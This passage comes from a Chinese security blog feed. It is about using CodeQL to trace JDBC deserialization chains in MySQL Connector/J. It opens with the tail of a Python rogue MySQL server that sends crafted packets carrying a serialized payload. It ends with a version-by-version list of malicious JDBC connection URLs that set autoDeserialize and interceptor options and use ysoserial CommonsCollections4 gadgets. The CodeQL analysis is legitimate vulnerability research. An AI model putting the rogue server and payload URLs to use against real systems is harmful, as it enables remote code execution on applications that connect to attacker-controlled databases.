class="string">&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn,_payload)</span><br><span class="line">                data=receive_data(conn)</span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                _payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, _payload)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set names&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;set character_set_results&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                send_data(conn, response_ok_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show session status&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                mysql_data = <span class="string">&#x27;0100000102&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                mysql_data += <span class="string">&#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27;</span></span><br><span class="line">                <span class="comment"># 为什么我加了EOF Packet 就无法正常运行呢？？</span></span><br><span class="line">                <span class="comment"># 获取payload</span></span><br><span class="line">                payload_content=get_payload_content()</span><br><span class="line">                <span class="comment"># 计算payload长度</span></span><br><span class="line">                payload_length = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">4</span>)</span><br><span class="line">                payload_length_hex = payload_length[<span class="number">2</span>:<span class="number">4</span>] + payload_length[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                <span class="comment"># 计算数据包长度</span></span><br><span class="line">                data_len = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload_content)//<span class="number">2</span> + <span class="number">4</span>)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).zfill(<span class="number">6</span>)</span><br><span class="line">                data_len_hex = data_len[<span class="number">4</span>:<span class="number">6</span>] + data_len[<span class="number">2</span>:<span class="number">4</span>] + data_len[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">                mysql_data += data_len_hex + <span class="string">&#x27;04&#x27;</span> + <span class="string">&#x27;fbfc&#x27;</span>+ payload_length_hex</span><br><span class="line">                mysql_data += <span class="built_in">str</span>(payload_content)</span><br><span class="line">                mysql_data += <span class="string">&#x27;07000005fe000022000100&#x27;</span></span><br><span class="line">                send_data(conn, mysql_data)</span><br><span class="line">                data = receive_data(conn)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;show warnings&quot;</span> <span class="keyword">in</span> data:</span><br><span class="line">                payload = <span class="string">&#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27;</span></span><br><span class="line">                send_data(conn, payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    HOST =<span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">    PORT = <span class="number">3307</span></span><br><span class="line"></span><br><span class="line">    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="comment">#当socket关闭后，本地端用于该socket的端口号立刻就可以被重用.为了实验的时候不用等待很长时间</span></span><br><span class="line">    sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">    sk.bind((HOST, PORT))</span><br><span class="line">    sk.listen(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(HOST,PORT))</span><br><span class="line"></span><br><span class="line">    run()</span><br></pre></td></tr></table></figure>    </div></div></p><h1 id="选用方法"><a href="#选用方法" class="headerlink" title="选用方法"></a>选用方法</h1><p>首先是选用污点追踪，还是用<code>polyCalls</code>的方法，这里不用多说，肯定是用<code>polyCalls</code>这种函数调用的方法去找出链子，因为这里并不是说像分析springweb那样，追踪传入的get/post参数看他有没有sql注入之类的。</p><h1 id="找Sink"><a href="#找Sink" class="headerlink" title="找Sink"></a>找Sink</h1><p>sink就是<code>readObject</code>，找到哪些函数调用了<code>readObject</code>.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class ReadObjects1 extends <span class="keyword">Call</span> &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.getCallee().hasName(&quot;readObject&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt></p><blockquote><p>因为这里的<code>readObject</code>是被调用的，也没有任何的定义，所以继承<code>Call</code>，<code>getCallee</code>是函数本身。<br>如果是<code>this.getCaller().hasName(&quot;readObject&quot;)</code>那么就是readObject中调用了什么函数，结果如下<br><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt></p></blockquote><p>在这里可以找到3个readObject，但是调用他们的函数只有两个，分别是</p><ul><li>com.mysql.cj.jdbc.result.ResultSetImpl-&gt;getObject（一个参数）</li><li>com.mysql.cj.jdbc.util.ResultSetUtil-&gt;readObject(两个参数)</li></ul><p>那么codeql可以写出两个sink<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class ReadObjects extends Callable &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.hasName(&quot;readObject&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc.util&quot;, &quot;ResultSetUtil&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getNumberOfParameters() <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class ReadObjects extends Callable &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.hasName(&quot;getObject&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc.result&quot;, &quot;ResultSetImpl&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getNumberOfParameters() <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>注意这里是Callable，因为是找函数的定义，而不是调用</p><h1 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h1><p>一般来说Source就是比较难找的，sink无非就是那些危险函数。source就千变万化了。<br>在这里应该就是<code>getConnection</code>，但是<code>getConnection</code>在package<code>java.sql</code>中，并不在我们分析的库中，所以这里用</p><ul><li>com.mysql.cj.jdbc.NonRegisteringDriver-&gt;connect</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GetConnection</span> <span class="keyword">extends</span> <span class="title class_">Callable</span> &#123;</span><br><span class="line">    GetConnection()&#123;</span><br><span class="line">        <span class="built_in">this</span>.hasName(<span class="string">&quot;connect&quot;</span>) and</span><br><span class="line">        <span class="built_in">this</span>.getDeclaringType().hasQualifiedName(<span class="string">&quot;com.mysql.cj.jdbc&quot;</span>,<span class="string">&quot;NonRegisteringDriver&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p>按source分为两块讲</p><h2 id="readObject"><a href="#readObject" class="headerlink" title="readObject"></a>readObject</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ReadObjects extends Callable &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.hasName(&quot;readObject&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc.util&quot;, &quot;ResultSetUtil&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getNumberOfParameters() <span class="operator">=</span> <span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetConnection extends Callable &#123;</span><br><span class="line">    GetConnection()&#123;</span><br><span class="line">        this.hasName(&quot;getInstance&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc&quot;,&quot;ConnectionImpl&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query predicate edges(Callable a, Callable b) &#123;</span><br><span class="line">    a.polyCalls(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> ReadObjects sink,GetConnection source</span><br><span class="line"><span class="keyword">where</span> edges<span class="operator">*</span>(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;Sink is reached from $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/6.png" alt></p><p>第一个没有东西链子</p><h2 id="getObject"><a href="#getObject" class="headerlink" title="getObject"></a>getObject</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class ReadObjects extends Callable &#123;</span><br><span class="line">    ReadObjects()&#123;</span><br><span class="line">        this.hasName(&quot;getObject&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc.result&quot;, &quot;ResultSetImpl&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getNumberOfParameters() <span class="operator">=</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetConnection extends Callable &#123;</span><br><span class="line">    GetConnection()&#123;</span><br><span class="line">        this.hasName(&quot;connect&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc&quot;,&quot;NonRegisteringDriver&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">query predicate edges(Callable a, Callable b) &#123;</span><br><span class="line">    a.polyCalls(b)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Sink sink,GetConnection source</span><br><span class="line"><span class="keyword">where</span> edges<span class="operator">*</span>(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink, source, sink, &quot;Sink is reached from $@.&quot;, sink, &quot;here&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p><p>有4条path，分别是</p><p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt></p><p>但是他只会显示一条路径，所以要继续分析的话，就要继续更改source，改为<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class GetConnection extends Callable &#123;</span><br><span class="line">    GetConnection()&#123;</span><br><span class="line">        this.hasName(&quot;getInstance&quot;) <span class="keyword">and</span></span><br><span class="line">        this.getDeclaringType().hasQualifiedName(&quot;com.mysql.cj.jdbc&quot;,&quot;ConnectionImpl&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt></p><h2 id="createProxyInstance"><a href="#createProxyInstance" class="headerlink" title="createProxyInstance"></a>createProxyInstance</h2><p><code>getInstance</code>这条链子就是网上大部分讲的东西，但是刚刚那层<code>connect</code>为source的结果还有几个proxy的函数就引起了我的注意，在这节就用<code>createProxyInstance</code>作为例子去分析。</p><p><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/7.png" alt></p><p>可以看到，在getInstance前面多了几个步骤，这里源码调试<br><img src="/2023/10/07/%E7%94%A8codeql%E5%88%86%E6%9E%90JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/8.png" alt><br>可以看到有很多协议头，这里应该首先去官网或者google搜索该协议，而不是去调试代码<br>这里搜到了</p><p><a href="https://dev.mysql.com/doc/connector-j/8.1/en/connector-j-reference-dns-srv.html">https://dev.mysql.com/doc/connector-j/8.1/en/connector-j-reference-dns-srv.html</a></p><p><code>mysqlx+srv://johndoe:secret@_mysql._tcp.mycompany.local/db?xdevapi.dns-srv=true</code><br>通过该payload，可以通过dns srv记录去攻击</p><blockquote><p>DNS SRV就是记录 domain对应的ip，而且还能记录下port</p></blockquote><p>但是这里就不搭建dns服务器了，至此就分析完毕了</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>这一节记录一下常用的payload</p><h2 id="detectCustomCollations链"><a href="#detectCustomCollations链" class="headerlink" title="detectCustomCollations链"></a>detectCustomCollations链</h2><h3 id="5-1-19-5-1-28"><a href="#5-1-19-5-1-28" class="headerlink" title="5.1.19-5.1.28"></a>5.1.19-5.1.28</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="5-1-29-5-1-40"><a href="#5-1-29-5-1-40" class="headerlink" title="5.1.29-5.1.40"></a>5.1.29-5.1.40</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="5-1-41-5-1-48"><a href="#5-1-41-5-1-48" class="headerlink" title="5.1.41-5.1.48"></a>5.1.41-5.1.48</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="6-0-2-6-0-6"><a href="#6-0-2-6-0-6" class="headerlink" title="6.0.2-6.0.6"></a>6.0.2-6.0.6</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&amp;autoDeserialize=true&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h2 id="ServerStatusDiffInterceptor链"><a href="#ServerStatusDiffInterceptor链" class="headerlink" title="ServerStatusDiffInterceptor链"></a>ServerStatusDiffInterceptor链</h2><h3 id="5-1-0-5-1-10"><a href="#5-1-0-5-1-10" class="headerlink" title="5.1.0-5.1.10"></a>5.1.0-5.1.10</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br><span class="line"><span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select database()&quot;</span>;</span><br><span class="line"><span class="type">PreparedStatement</span> <span class="variable">ps</span> <span class="operator">=</span> conn.prepareStatement(sql);</span><br><span class="line"><span class="comment">//执行查询操作，返回的是数据库结果集的数据表</span></span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> ps.executeQuery();</span><br></pre></td></tr></table></figure><h3 id="5-1-11-5-x-xx"><a href="#5-1-11-5-x-xx" class="headerlink" title="5.1.11-5.x.xx"></a>5.1.11-5.x.xx</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="6-x"><a href="#6-x" class="headerlink" title="6.x"></a>6.x</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><h3 id="8-0-7-8-0-20"><a href="#8-0-7-8-0-20" class="headerlink" title="8.0.7-8.0.20"></a>8.0.7-8.0.20</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;user=yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;yso_CommonsCollections4_calc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">conn = DriverManager.getConnection(url,username,password);</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;网上大部分都是直接分析JDBC的过程，我这里就不赘述了，这里说一下用codeql分析的思路&lt;br&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="codeql" scheme="https://kaikaix.github.io/categories/codeql/"/>
    
    
    <category term="代码审计" scheme="https://kaikaix.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="java" scheme="https://kaikaix.github.io/tags/java/"/>
    
    <category term="codeql" scheme="https://kaikaix.github.io/tags/codeql/"/>
    
  </entry>
  
  <entry>
    <title>读写锁</title>
    <link href="https://kaikaix.github.io/2023/10/06/%E8%AF%BB%E5%86%99%E9%94%81/"/>
    <id>https://kaikaix.github.io/2023/10/06/%E8%AF%BB%E5%86%99%E9%94%81/</id>
    <published>2023-10-06T13:13:27.000Z</published>
    <updated>2023-10-07T00:21:32.808Z</updated>
    
